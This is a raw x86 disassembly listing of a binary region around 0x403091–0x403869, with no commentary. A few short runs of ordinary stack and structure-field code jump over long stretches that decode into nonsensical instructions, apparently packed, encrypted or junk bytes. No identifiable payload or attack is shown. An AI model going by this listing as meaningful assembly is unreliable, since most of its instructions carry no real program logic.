  403091:	and    DWORD PTR [edi-0x7a],0xcd0b8588
  403098:	xchg   edi,eax
  403099:	repnz repnz out dx,eax
  40309c:	retf   
  40309d:	mov    edi,0xd2fc3f91
  4030a2:	call   0xe45ce487
  4030a7:	inc    ebx
  4030a8:	mov    ds:0x9bba20c7,eax
  4030ad:	mov    eax,0x3d4488fe
  4030b2:	pop    ebx
  4030b3:	jl     0x403072
  4030b5:	retf   
  4030b6:	test   DWORD PTR [edx],0x4c33cc64
  4030bc:	hlt    
  4030bd:	jbe    0x4030c3
  4030bf:	mov    ch,0xba
  4030c1:	mov    dh,0xbf
  4030c3:	bound  esi,QWORD PTR [edx]
  4030c5:	cwde   
  4030c6:	push   ecx
  4030c7:	or     esi,DWORD PTR [ecx+0x58]
  4030ca:	adc    bh,dl
  4030cc:	test   BYTE PTR [esi+edi*2-0x71c72974],dh
  4030d3:	jne    0x4030a5
  4030d5:	loop   0x403078
  4030d7:	jmp    0x403132
  4030d9:	xchg   edx,eax
  4030da:	push   0x37b09a8
  4030df:	mov    cl,0x43
  4030e1:	mov    ebp,0xdad2aaef
  4030e6:	inc    esi
  4030e7:	jl     0x40314e
  4030e9:	mov    WORD PTR [ebp+ebx*1-0x216aadcd],ss
  4030f0:	mov    bh,0x26
  4030f2:	xchg   ebx,eax
  4030f3:	lock (bad) 
  4030f5:	neg    BYTE PTR [esi-0x7ee13be0]
  4030fb:	in     al,dx
  4030fc:	sub    BYTE PTR [edx],dl
  4030fe:	mov    al,ds:0x23855dec
  403103:	add    eax,0x3bddaea6
  403108:	fisttp QWORD PTR ds:0x9becae40
  40310e:	ret    0x50e6
  403111:	xchg   edx,eax
  403112:	push   edx
  403113:	push   0x12ad6f50
  403118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403119:	or     bl,ah
  40311b:	xchg   edi,eax
  40311c:	add    DWORD PTR [ebx],esi
  40311e:	sar    DWORD PTR [eax+0x15],1
  403121:	jp     0x403119
  403123:	adc    al,0x4b
  403125:	mov    ch,0x86
  403127:	adc    bh,BYTE PTR [edi+0x6ae930c5]
  40312d:	sub    al,0x1f
  40312f:	das    
  403130:	ja     0x403171
  403132:	(bad)  
  403133:	(bad)  
  403134:	cmp    esp,ecx
  403136:	ret    0x3037
  403139:	cmp    cl,BYTE PTR [esi-0x77]
  40313c:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  403142:	clc    
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0xac
  40316d:	adc    cl,bh
  40316f:	test   al,0x89
  403171:	adc    eax,0x7d6f7e7e
  403176:	jle    0x4031f6
  403178:	adc    BYTE PTR [esi],cl
  40317a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40317b:	inc    esp
  40317c:	js     0x403141
  40317e:	popa   
  40317f:	cmp    DWORD PTR [eax-0x13170b07],ebp
  403185:	cmp    eax,0xf5cca2d0
  40318a:	(bad)  
  40318b:	in     al,dx
  40318c:	jmp    0x40313e
  40318e:	fmul   st(2),st
  403190:	pushf  
  403191:	retf   0x860b
  403194:	pop    esi
  403195:	xor    al,0xea
  403197:	jmp    0x403180
  403199:	cs push ds
  40319b:	push   0x1d028f40
  4031a0:	int3   
  4031a1:	in     al,0x86
  4031a3:	repnz pop ecx
  4031a5:	mov    ch,0x48
  4031a7:	sub    eax,0xa1b9e87c
  4031ac:	test   ch,0x5b
  4031af:	mov    ds:0x523da366,eax
  4031b4:	or     eax,0x366539e9
  4031b9:	jns    0x403231
  4031bb:	das    
  4031bc:	fmul   DWORD PTR [esi-0x17]
  4031bf:	xlat   BYTE PTR ds:[ebx]
  4031c0:	out    0x72,al
  4031c2:	cli    
  4031c3:	mov    edi,0x4a180f0
  4031c8:	test   eax,0xdb17f2d0
  4031cd:	das    
  4031ce:	jmp    0x53fdf957
  4031d3:	in     eax,0x46
  4031d5:	push   edx
  4031d6:	xchg   DWORD PTR [eax+0x15cf6c2b],esp
  4031dc:	fs iret 
  4031de:	push   edx
  4031df:	adc    dh,BYTE PTR [edx-0x1aa2245e]
  4031e5:	inc    ebp
  4031e6:	cmp    BYTE PTR [ebp-0x3706645],ch
  4031ec:	xor    dl,cl
  4031ee:	xchg   ebp,eax
  4031ef:	push   esi
  4031f0:	jg     0x403178
  4031f2:	adc    al,0xff
  4031f4:	(bad)  
  4031f5:	aad    0xf8
  4031f7:	lock enter 0xf49,0xaf
  4031fc:	test   eax,0x3db84d51
  403201:	cmp    ah,bh
  403203:	jb     0x403262
  403205:	dec    esi
  403206:	pusha  
  403207:	into   
  403208:	enter  0xcf1d,0xde
  40320c:	clc    
  40320d:	(bad)
  403210:	pop    edx
  403211:	cmp    al,0x28
  403213:	mov    bl,0xcc
  403215:	push   ebp
  403216:	xor    BYTE PTR [esi],al
  403218:	das    
  403219:	lahf   
  40321a:	inc    ebp
  40321b:	stos   BYTE PTR es:[edi],al
  40321c:	je     0x40324d
  40321e:	in     eax,dx
  40321f:	jmp    0x403231
  403221:	retf   0x1559
  403224:	mov    ebx,0x5d758b75
  403229:	add    al,BYTE PTR [ebp-0x4e24158a]
  40322f:	xchg   ebp,eax
  403230:	or     eax,0x211c8f8f
  403235:	mov    DWORD PTR [edi+eax*8-0xb],eax
  403239:	addr16 push ebp
  40323b:	in     eax,dx
  40323c:	mov    esp,esp
  40323e:	add    bl,ah
  403240:	xchg   edi,eax
  403241:	sbb    ebp,DWORD PTR [edx-0x2]
  403244:	push   ecx
  403245:	call   DWORD PTR [eax+0x16abf472]
  40324b:	mov    ah,0x0
  40324d:	lock sbb BYTE PTR [ebp-0x19ecb909],bh
  403254:	mov    bl,BYTE PTR [edx]
  403256:	ret    
  403257:	dec    edi
  403258:	pop    eax
  403259:	lock rcl DWORD PTR [edi-0x3a7a4513],cl
  403260:	jnp    0x4032c5
  403262:	mov    esp,0x30e2e96b
  403267:	(bad)  
  403268:	pushf  
  403269:	and    DWORD PTR [edi],ecx
  40326b:	pop    ecx
  40326c:	es mov ebx,0x1a64de59
  403272:	push   edx
  403273:	aad    0x87
  403275:	mov    ds:0x1c438313,al
  40327a:	retf   0x5987
  40327d:	push   edi
  40327e:	mov    edx,0xf829f0d1
  403283:	push   edx
  403284:	pop    ss
  403285:	imul   esi,DWORD PTR [edx+0x8adb8f1],0x60e31baa
  40328f:	aam    0xb9
  403291:	sbb    BYTE PTR [esi],bh
  403293:	dec    ebx
  403294:	pop    eax
  403295:	inc    ebx
  403296:	ror    DWORD PTR ds:[ebx],1
  403299:	ins    BYTE PTR es:[edi],dx
  40329a:	mov    edx,0x8771400
  40329f:	shr    ebx,1
  4032a1:	xor    esp,edx
  4032a3:	(bad)  
  4032a5:	call   0x4c3f7aa1
  4032aa:	sbb    bl,al
  4032ac:	jnp    0x403323
  4032ae:	adc    DWORD PTR [edx],ebp
  4032b0:	xchg   DWORD PTR [edi+0x7bc64ac7],eax
  4032b6:	pushf  
  4032b7:	pop    edx
  4032b8:	jecxz  0x403256
  4032ba:	jne    0x403250
  4032bc:	xchg   ebx,eax
  4032bd:	stc    
  4032be:	mov    esi,0x91d81b76
  4032c3:	scas   al,BYTE PTR es:[edi]
  4032c4:	push   DWORD PTR [esi+ebx*1-0x2fa1dc26]
  4032cb:	jecxz  0x40331e
  4032cd:	int    0xf3
  4032cf:	sbb    bl,cl
  4032d1:	sub    ebx,DWORD PTR [ebx]
  4032d3:	adc    dh,BYTE PTR [edx]
  4032d5:	nop
  4032d6:	dec    ebp
  4032d7:	cs xchg edi,eax
  4032d9:	jo     0x4032d2
  4032db:	push   eax
  4032dc:	push   edx
  4032dd:	adc    al,0x1f
  4032df:	(bad)  
  4032e1:	jle    0x403314
  4032e3:	outs   dx,BYTE PTR ds:[esi]
  4032e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e5:	pop    es
  4032e6:	xchg   esi,eax
  4032e7:	mov    esi,0xb1d281fe
  4032ec:	xchg   edi,eax
  4032ed:	mov    ecx,0x79e7689c
  4032f2:	cwde   
  4032f3:	fs mov bh,0xcb
  4032f6:	jle    0x403294
  4032f8:	sbb    DWORD PTR [ebx],edx
  4032fa:	or     DWORD PTR [ebp+0x7c],0xee5f9c7a
  403301:	(bad)  
  403302:	or     edx,DWORD PTR [esi-0x22]
  403305:	pop    edx
  403306:	stos   DWORD PTR es:[edi],eax
  403307:	ret    
  403308:	bound  edi,QWORD PTR [ecx+eax*4+0x6e]
  40330c:	jbe    0x403294
  40330e:	jo     0x403338
  403310:	mov    edi,0x332c7077
  403315:	dec    ecx
  403316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403317:	mov    ?,WORD PTR [ecx]
  403319:	sbb    DWORD PTR [ebx-0x27],0x6e41ca9c
  403320:	sti    
  403321:	pop    ds
  403322:	jno    0x4032dc
  403324:	cmp    eax,eax
  403326:	retf   0x99a1
  403329:	(bad)  
  40332a:	inc    edx
  40332b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40332c:	outs   dx,DWORD PTR ds:[esi]
  40332d:	inc    eax
  40332e:	inc    esp
  40332f:	pop    ebx
  403330:	jmp    0x23826ea0
  403335:	jl     0x403368
  403337:	in     eax,dx
  403338:	mov    eax,ds:0xcf13e604
  40333d:	into   
  40333e:	out    0xcf,eax
  403340:	xchg   edi,eax
  403341:	cmp    BYTE PTR [edx],dl
  403343:	neg    dl
  403345:	jb     0x40334b
  403347:	ins    BYTE PTR es:[edi],dx
  403348:	aas    
  403349:	sub    al,0x5a
  40334b:	pop    ebx
  40334c:	aas    
  40334d:	stc    
  40334e:	bound  ebx,QWORD PTR [esp+edi*8+0x4b76373a]
  403355:	popa   
  403356:	out    dx,eax
  403357:	cmp    al,BYTE PTR [eax+0x78]
  40335a:	mov    cl,0x52
  40335c:	cld    
  40335d:	mov    eax,0x10b0418c
  403362:	push   esp
  403363:	adc    al,0x88
  403365:	daa    
  403366:	push   edx
  403367:	ins    BYTE PTR es:[edi],dx
  403368:	cwde   
  403369:	(bad)  
  40336b:	call   DWORD PTR [eax]
  40336d:	aam    0x6e
  40336f:	mov    ebp,edx
  403371:	push   cs
  403372:	(bad)  
  403373:	repnz cmovs edi,DWORD PTR [ebx+0x45]
  403378:	mov    edi,esp
  40337a:	fsubr  QWORD PTR [edi+0x49acaf68]
  403380:	mov    DWORD PTR [ebp+eiz*4-0x37],esp
  403384:	ficom  WORD PTR [edx+edi*4+0x6f]
  403388:	jmp    DWORD PTR [edx]
  40338a:	addr16 mov eax,0xb2efb8b9
  403390:	pop    ds
  403391:	sbb    bh,BYTE PTR [ebp+0x17]
  403394:	inc    edi
  403395:	arpl   WORD PTR [edx+0x1c],di
  403398:	jne    0x40338b
  40339a:	push   ds
  40339b:	pop    ecx
  40339c:	adc    ecx,edi
  40339e:	fsub   QWORD PTR [ebp-0x7e6e2986]
  4033a4:	call   0xb6c1a374
  4033a9:	aam    0x7f
  4033ab:	mov    cl,0x48
  4033ad:	outs   dx,DWORD PTR ds:[esi]
  4033ae:	outs   dx,BYTE PTR ds:[esi]
  4033af:	cld    
  4033b0:	mov    eax,DWORD PTR [edi-0x23140617]
  4033b6:	test   eax,0x9e360e7c
  4033bb:	dec    esp
  4033bc:	xchg   ecx,eax
  4033bd:	and    DWORD PTR [ebp-0x7f],edi
  4033c0:	fnstenv [ecx]
  4033c2:	das    
  4033c3:	dec    ebp
  4033c4:	push   esi
  4033c5:	xchg   edx,eax
  4033c6:	push   ebx
  4033c7:	mov    al,ds:0x4a31e65d
  4033cc:	cmp    DWORD PTR [esi],esi
  4033ce:	jl     0x10bf94b3
  4033d4:	cmp    ecx,edx
  4033d6:	mov    dh,0xca
  4033d8:	int    0x5a
  4033da:	and    DWORD PTR [ebx],eax
  4033dc:	cmp    DWORD PTR [edi+0x22c76184],edx
  4033e2:	stc    
  4033e3:	push   edi
  4033e4:	test   BYTE PTR [ecx+ecx*2+0x47ed316b],bh
  4033eb:	mov    sp,0xbe6b
  4033ef:	jecxz  0x40342b
  4033f1:	and    edi,DWORD PTR [esi]
  4033f3:	out    dx,eax
  4033f4:	sahf   
  4033f5:	inc    ebp
  4033f6:	xchg   DWORD PTR [bp+0x59],ebx
  4033fa:	sub    DWORD PTR [edi],ecx
  4033fc:	call   0x824d:0xa21e3827
  403403:	retf   0x59
  403406:	ror    DWORD PTR [edx+0x36],0xb7
  40340a:	lock cmp DWORD PTR [edx+0x6917e52f],0x77f06d2d
  403415:	int3   
  403416:	test   BYTE PTR [edi],bl
  403418:	push   esi
  403419:	pop    edx
  40341a:	and    ebp,DWORD PTR [edx]
  40341c:	loopne 0x4033d5
  40341e:	mov    edx,0xef671648
  403423:	jecxz  0x403478
  403425:	ja     0x40340c
  403427:	pop    esp
  403428:	jge    0x4033c2
  40342a:	dec    ebx
  40342b:	fdiv   st,st(1)
  40342d:	xlat   BYTE PTR ds:[ebx]
  40342e:	cdq    
  40342f:	arpl   WORD PTR [eax+0x7d569117],cx
  403435:	call   0x71f46e5f
  40343a:	or     BYTE PTR [ebp+0x5f96748e],0x74
  403441:	lds    edx,FWORD PTR [eax+0x25bfadb6]
  403447:	ret    0xb472
  40344a:	xchg   ebx,ebp
  40344c:	sti    
  40344d:	outs   dx,BYTE PTR gs:[esi]
  40344f:	jl     0x403423
  403451:	shl    DWORD PTR [edx-0x3fa88abe],0x3e
  403458:	inc    ecx
  403459:	(bad)  
  40345a:	in     eax,0xfd
  40345c:	outs   dx,BYTE PTR ds:[esi]
  40345d:	sub    ebx,edi
  40345f:	sub    ch,ah
  403461:	fadd   QWORD PTR [ebp+0x705f7f2a]
  403467:	inc    esi
  403468:	inc    edx
  403469:	sbb    ecx,edx
  40346b:	xchg   edx,eax
  40346c:	lock mov al,0x5b
  40346f:	hlt    
  403470:	xchg   ebx,eax
  403471:	mov    ah,0x3a
  403473:	out    0x6d,eax
  403475:	mov    bl,0xea
  403477:	call   0xfc4045c6
  40347c:	push   ds
  40347d:	sbb    cl,BYTE PTR [esi+esi*1+0x60]
  403481:	outs   dx,BYTE PTR ds:[esi]
  403482:	push   0x2e
  403484:	xchg   ebx,eax
  403485:	sets   BYTE PTR [esi+edi*8+0x5]
  40348a:	and    al,0x89
  40348c:	sub    BYTE PTR [ebp-0x10984f53],ch
  403492:	ret    
  403493:	mov    ebp,0xaa30179d
  403498:	out    dx,al
  403499:	cmp    DWORD PTR [esi-0x39],eax
  40349c:	xor    esp,DWORD PTR [ebx+esi*4-0x1823ff2c]
  4034a3:	xchg   ebp,eax
  4034a4:	loopne 0x40344b
  4034a6:	sti    
  4034a7:	shl    BYTE PTR [eax+eax*4],cl
  4034aa:	stos   DWORD PTR es:[edi],eax
  4034ab:	hlt    
  4034ac:	hlt    
  4034ad:	and    bl,BYTE PTR [ecx]
  4034af:	fisttp DWORD PTR [ecx]
  4034b1:	pop    ecx
  4034b2:	ins    DWORD PTR es:[edi],dx
  4034b3:	dec    ebx
  4034b4:	popf   
  4034b5:	mov    ebp,0x8f2491f1
  4034ba:	daa    
  4034bb:	jae    0x403454
  4034bd:	cmp    al,0x95
  4034bf:	addr16 cli 
  4034c1:	arpl   WORD PTR [esi+0x4a],sp
  4034c4:	daa    
  4034c5:	setg   BYTE PTR [ebx-0x57]
  4034c9:	mov    dh,0xab
  4034cb:	dec    esp
  4034cc:	add    eax,0xb71d1493
  4034d1:	(bad)  
  4034d2:	cmp    al,0xa8
  4034d4:	ins    DWORD PTR es:[edi],dx
  4034d5:	shl    DWORD PTR [ebx+0x25a2b0],0xd0
  4034dc:	mov    eax,ds:0x53291ddc
  4034e1:	jb     0x403550
  4034e3:	das    
  4034e4:	ds js  0x40353e
  4034e7:	or     BYTE PTR [eax-0x72074b64],ch
  4034ed:	adc    eax,DWORD PTR [eax+0x69]
  4034f0:	mov    ebx,0x69d599bb
  4034f5:	aam    0xcf
  4034f7:	shl    BYTE PTR [edi+0x7a],cl
  4034fa:	dec    esi
  4034fb:	ins    DWORD PTR es:[edi],dx
  4034fc:	out    dx,al
  4034fd:	mov    ecx,DWORD PTR [ebx-0x493315b7]
  403503:	or     BYTE PTR [ebx-0x56eb5108],dl
  403509:	loopne 0x40357c
  40350b:	jo     0x4034d8
  40350d:	lea    edx,[eax]
  40350f:	xor    al,0xb9
  403511:	mov    bh,0xd
  403513:	push   edi
  403514:	xchg   esi,eax
  403515:	xor    BYTE PTR [esi-0x2e],dl
  403518:	ja     0x403521
  40351a:	into   
  40351b:	cmp    eax,DWORD PTR [ebx+ebx*4+0x7f]
  40351f:	lahf   
  403520:	fstp   TBYTE PTR [ebx]
  403522:	stos   BYTE PTR es:[edi],al
  403523:	or     esp,DWORD PTR [ecx-0xe30a9e]
  403529:	dec    esp
  40352a:	xchg   ebp,eax
  40352b:	shl    DWORD PTR [edx-0x52],0x6f
  40352f:	mov    al,0x30
  403531:	adc    BYTE PTR [edx],0x20
  403534:	add    ebp,edi
  403536:	into   
  403537:	jmp    0x44d0:0xd16568
  40353e:	cmp    esp,0x80e5589a
  403544:	repz mov cs,ecx
  403547:	mov    bl,0x57
  403549:	push   ebp
  40354a:	dec    edi
  40354b:	ret    0xa765
  40354e:	(bad)  
  40354f:	int    0x4f
  403551:	mov    ebx,0x16ae85ac
  403556:	pusha  
  403557:	mov    DWORD PTR [esi],eax
  403559:	outs   dx,DWORD PTR ds:[esi]
  40355a:	jmp    0x8598e5d9
  40355f:	dec    ebp
  403560:	sahf   
  403561:	mov    bh,0x1e
  403563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403564:	adc    al,0x5f
  403566:	cli    
  403567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403568:	inc    esp
  403569:	mov    ecx,DWORD PTR [ebp-0x8]
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	out    dx,al
  403598:	gs inc ebp
  40359a:	jmp    0x7ebe4725
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x4035f4
  4035a4:	mov    ds:0xe06bf732,eax
  4035a9:	(bad)  
  4035aa:	loope  0x40356a
  4035ac:	fisttp DWORD PTR [esi+ecx*1-0x7c]
  4035b0:	lods   al,BYTE PTR ds:[esi]
  4035b1:	lahf   
  4035b2:	cmp    BYTE PTR [ebx+esi*8-0x246d4a69],bl
  4035b9:	fmul   DWORD PTR [ecx+0x78]
  4035bc:	jmp    FWORD PTR [ebp+0x60]
  4035bf:	sar    BYTE PTR [eax+0x6a],1
  4035c2:	(bad)  
  4035c3:	xchg   ebp,eax
  4035c4:	sbb    al,BYTE PTR ds:0x3859ed23
  4035ca:	mov    WORD PTR [ecx+0x1f],fs
  4035cd:	xor    esi,eax
  4035cf:	cmp    al,0x69
  4035d1:	hlt    
  4035d2:	jmp    0xb7958e7d
  4035d7:	mov    eax,0x9689f584
  4035dc:	mov    edx,0xcee9ceb7
  4035e1:	ja     0x403583
  4035e3:	xchg   edi,eax
  4035e4:	jne    0x403613
  4035e6:	or     al,0xe1
  4035e8:	xlat   BYTE PTR ds:[ebx]
  4035e9:	(bad)  
  4035eb:	ins    BYTE PTR es:[edi],dx
  4035ec:	hlt    
  4035ed:	stos   BYTE PTR es:[edi],al
  4035ee:	or     ecx,0xfffffff9
  4035f1:	fild   WORD PTR ds:0x757803ef
  4035f7:	(bad)  
  4035f8:	mov    ebx,0xeb7c5f4e
  4035fd:	jb     0x40361f
  4035ff:	aaa    
  403600:	push   ebp
  403601:	sbb    al,0xfa
  403603:	das    
  403604:	jmp    0x576a:0xf9b90412
  40360b:	add    al,0x21
  40360d:	pop    edi
  40360e:	test   BYTE PTR [ebp+0x36],ah
  403611:	test   al,0x62
  403613:	inc    edx
  403614:	out    dx,al
  403615:	rcr    DWORD PTR [edx-0x2d],1
  403618:	jp     0x4035db
  40361a:	cmp    eax,0xd06bda9b
  40361f:	cs cmp al,0x13
  403622:	(bad)  
  403623:	jns    0x4035c4
  403625:	jge    0x4035e4
  403627:	arpl   sp,dx
  403629:	jecxz  0x403677
  40362b:	push   eax
  40362c:	scas   eax,DWORD PTR es:[edi]
  40362d:	or     DWORD PTR [ecx+0x10cd8cbe],eax
  403633:	inc    edi
  403634:	xlat   BYTE PTR ds:[ebx]
  403635:	push   ebp
  403636:	add    BYTE PTR [ebp+ebp*1-0x55],dh
  40363a:	add    BYTE PTR [ebx],bh
  40363c:	cmp    al,BYTE PTR ss:[ecx-0x2f9a22d4]
  403643:	ficomp WORD PTR [ebx]
  403645:	mov    ds:0xed5a1a15,al
  40364a:	jmp    0x82b69cec
  40364f:	ror    DWORD PTR [edx],cl
  403651:	clc    
  403652:	cwde   
  403653:	pop    ds
  403654:	or     eax,0x477e4b5f
  403659:	push   esi
  40365a:	pop    ss
  40365b:	jne    0x4036c5
  40365d:	mov    ecx,DWORD PTR [ecx+0x2b7773b8]
  403663:	hlt    
  403664:	push   es
  403665:	and    eax,0x8ec018e6
  40366a:	daa    
  40366b:	push   0xfffffffd
  40366d:	int3   
  40366e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40366f:	fs jns 0x4036f0
  403672:	xor    BYTE PTR [ebx+0x10],0xba
  403676:	bound  edx,QWORD PTR [edx+0x6e3994d4]
  40367c:	icebp  
  40367d:	mov    esi,0xc78cdbdb
  403682:	add    dl,BYTE PTR [esi]
  403684:	xchg   ecx,eax
  403685:	test   eax,0xdbd9bfd7
  40368a:	hlt    
  40368b:	cs sub al,0x61
  40368e:	gs popa 
  403690:	test   BYTE PTR [ebx+edx*2],al
  403693:	push   0x19
  403695:	sub    ecx,DWORD PTR [ebx-0x7a]
  403698:	aam    0x93
  40369a:	scas   al,BYTE PTR es:[edi]
  40369b:	ror    BYTE PTR fs:[esi+0x19],cl
  40369f:	test   BYTE PTR [ecx-0xc],dl
  4036a2:	adc    ebx,DWORD PTR [ebp+edx*4+0x33f0f2f1]
  4036a9:	lods   eax,DWORD PTR ds:[esi]
  4036aa:	xor    al,al
  4036ac:	mov    cl,0xed
  4036ae:	adc    dh,BYTE PTR [eax]
  4036b0:	jno    0x4036de
  4036b2:	push   esp
  4036b3:	sub    bh,dl
  4036b5:	adc    DWORD PTR [ecx+0x18],edi
  4036b8:	add    al,0x7d
  4036ba:	fbld   TBYTE PTR [edx-0x995db2c]
  4036c0:	pop    es
  4036c1:	sub    DWORD PTR [ebp+0x6e],edi
  4036c4:	sbb    esi,DWORD PTR fs:[eax+0x4]
  4036c8:	sub    DWORD PTR [esi],edx
  4036ca:	dec    edx
  4036cb:	out    0xf5,eax
  4036cd:	mov    DWORD PTR [ecx-0x36],eax
  4036d0:	sbb    ebx,edx
  4036d2:	js     0x40370c
  4036d4:	xor    edi,edi
  4036d6:	inc    ebp
  4036d7:	ja     0x40366f
  4036d9:	adc    dh,BYTE PTR [ebx]
  4036db:	aam    0x1a
  4036dd:	fadd   st(7),st
  4036df:	pop    eax
  4036e0:	sbb    ebp,esi
  4036e2:	sub    DWORD PTR [ebx],ebx
  4036e4:	push   ecx
  4036e5:	jns    0x4036be
  4036e7:	sub    edx,DWORD PTR [edi-0x13]
  4036ea:	stc    
  4036eb:	jns    0x40370e
  4036ed:	and    edi,DWORD PTR [esi+0x5c]
  4036f0:	inc    esi
  4036f1:	add    BYTE PTR [edi-0x58],ch
  4036f4:	(bad)  
  4036f6:	mov    ds:0x67c9fd48,al
  4036fb:	add    al,0x53
  4036fd:	pop    eax
  4036fe:	in     eax,0x91
  403700:	xchg   ecx,eax
  403701:	pusha  
  403702:	add    bh,BYTE PTR [esi+0x409666f8]
  403708:	and    ebx,0xa3a1dacd
  40370e:	not    BYTE PTR [ebp+0x1b]
  403711:	lahf   
  403712:	retf   
  403713:	lahf   
  403714:	repz xor dh,BYTE PTR [edx-0x15]
  403718:	ss out dx,al
  40371a:	test   eax,0x24134b70
  40371f:	xor    esi,ecx
  403721:	(bad)  
  403722:	pmulhw mm2,QWORD PTR [edi+esi*2-0x54]
  403727:	cmp    eax,0x31639d82
  40372c:	push   ss
  40372d:	pop    ebp
  40372e:	ja     0x4036e0
  403730:	retf   0x403b
  403733:	adc    edx,DWORD PTR [edx+0xba48e9c]
  403739:	ficom  WORD PTR [eax+eax*1-0x3104e4bc]
  403741:	arpl   WORD PTR [edi+0x36],bx
  403744:	aad    0xd1
  403746:	test   DWORD PTR [ebx-0x3e],ebx
  403749:	lods   al,BYTE PTR ds:[esi]
  40374a:	push   edx
  40374b:	enter  0x7e1c,0xb5
  40374f:	fisttp DWORD PTR [edi+0x6a]
  403752:	imul   BYTE PTR [esi-0x17]
  403755:	sub    al,0x3
  403757:	dec    edx
  403758:	mov    al,0xf1
  40375a:	js     0x403783
  40375c:	pop    ss
  40375d:	imul   esi,esi,0x6a2a8e9d
  403763:	mov    ds:0x7fba006,eax
  403768:	clc    
  403769:	cmp    ebx,DWORD PTR [esi]
  40376b:	jmp    0x403729
  40376d:	push   ds
  40376e:	outs   dx,DWORD PTR ds:[esi]
  40376f:	frstor [edi]
  403771:	mov    edi,0x824f8a68
  403776:	mov    BYTE PTR [ebx],ch
  403778:	mov    ds:0xa2cb3923,al
  40377d:	xor    BYTE PTR [esi],al
  40377f:	inc    eax
  403780:	mov    edx,0x2009ad83
  403785:	les    edi,FWORD PTR [ebp+0x263cd51b]
  40378b:	mov    bh,0x13
  40378d:	cdq    
  40378e:	or     bl,al
  403790:	outs   dx,BYTE PTR ds:[esi]
  403791:	sub    bh,BYTE PTR ds:0xbca0a1e
  403797:	xor    BYTE PTR [edi-0x1349f99f],ah
  40379d:	lahf   
  40379e:	js     0x4037b3
  4037a0:	jno    0x403787
  4037a2:	add    BYTE PTR [ebx+0x76],dl
  4037a5:	cld    
  4037a6:	xchg   ebx,eax
  4037a7:	test   eax,0x9c07bc25
  4037ac:	xchg   ebp,eax
  4037ad:	nop
  4037ae:	icebp  
  4037af:	lds    esp,FWORD PTR [edi]
  4037b1:	lock inc esp
  4037b3:	mov    ecx,esi
  4037b5:	xchg   ecx,eax
  4037b6:	push   0x711a46f9
  4037bb:	mov    ebp,0x9e70d4be
  4037c0:	retf   0x19ee
  4037c3:	loopne 0x4037ac
  4037c5:	jnp    0x403837
  4037c7:	cs das 
  4037c9:	sbb    esi,DWORD PTR [ecx+0x21f1ecbb]
  4037cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d0:	dec    edx
  4037d1:	xor    eax,0x7c4b8c5b
  4037d6:	inc    edi
  4037d7:	adc    esi,ecx
  4037d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037da:	imul   esp,DWORD PTR [esi-0x54f35e6b],0x6dd657e5
  4037e4:	or     cl,BYTE PTR [eax+eax*1-0x20]
  4037e8:	cli    
  4037e9:	dec    DWORD PTR [esi+eiz*1]
  4037ec:	and    edx,DWORD PTR [ebx]
  4037ee:	xor    al,0xfe
  4037f0:	lock stos BYTE PTR es:[edi],al
  4037f2:	repnz mov esi,0x490ab2ca
  4037f8:	fsubr  st,st(3)
  4037fa:	(bad)  
  4037fb:	(bad)  
  4037fc:	mov    eax,ds:0xf14a680f
  403801:	gs jno 0x403858
  403804:	test   al,0x6e
  403806:	outs   dx,BYTE PTR ds:[esi]
  403807:	aaa    
  403808:	lds    esp,FWORD PTR [ebp+0x55]
  40380b:	retf   0xe8a7
  40380e:	cmp    ch,BYTE PTR [esi-0x42e1242]
  403814:	ret    0x6980
  403817:	inc    edi
  403818:	inc    edi
  403819:	mov    dh,0xfd
  40381b:	std    
  40381c:	cld    
  40381d:	dec    ebx
  40381e:	pop    esi
  40381f:	mov    ecx,0x313d28f4
  403824:	jmp    0x4038a5
  403826:	sub    DWORD PTR [ebx+0x21],edi
  403829:	cli    
  40382a:	outs   dx,BYTE PTR ds:[esi]
  40382b:	mov    al,ds:0xbe83a370
  403830:	xor    BYTE PTR ds:0xac5a40fa,bl
  403836:	jns    0x403844
  403838:	mov    ch,0x70
  40383a:	in     eax,dx
  40383b:	dec    ebp
  40383c:	pop    ss
  40383d:	retf   0xd369
  403840:	bound  ebp,QWORD PTR [ecx]
  403842:	sbb    ebp,DWORD PTR [esi+0xe]
  403845:	xchg   ecx,eax
  403846:	js     0xdb81c2ea
  40384c:	jae    0x4037e5
  40384e:	push   ds
  40384f:	mov    DWORD PTR [esi-0x17],ebp
  403852:	mov    ds:0xf86ffcaa,al
  403857:	sub    ah,bh
  403859:	das    
  40385a:	mov    ds:0x46b05018,al
  40385f:	and    eax,0xdf305719
  403864:	mov    ah,0x5d
  403866:	or     DWORD PTR [edi+0x54],ebx
  403869:	add    bh,BYTE PTR [edi+eiz*2]
